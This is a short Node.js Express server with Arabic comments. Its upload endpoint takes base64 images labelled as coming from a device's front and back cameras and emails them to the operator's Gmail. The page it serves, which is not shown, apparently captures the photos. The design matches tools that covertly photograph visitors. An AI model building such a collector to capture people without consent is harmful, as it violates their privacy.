const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json({ limit: '20mb' })); // زيادة الحد لاستيعاب صورتين

app.post('/upload', async (req, res) => {
  const { frontImage, backImage } = req.body;

  if (!frontImage || !backImage) {
    return res.status(400).json({ error: 'يرجى إرسال الصورتين: الأمامية والخلفية.' });
  }

  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.GMAIL_USER,
    subject: '📷 صورتين من الكاميرا',
    html: '<p>الصور الملتقطة من الكاميرتين:</p>',
    attachments: [
      {
        filename: 'front-camera.png',
        content: frontImage.split("base64,")[1],
        encoding: 'base64'
      },
      {
        filename: 'back-camera.png',
        content: backImage.split("base64,")[1],
        encoding: 'base64'
      }
    ]
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('✅ تم إرسال الصور بنجاح.');
    res.sendStatus(200);
  } catch (error) {
    console.error('❌ فشل في إرسال البريد:', error);
    res.sendStatus(500);
  }
});

app.use(express.static(__dirname));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
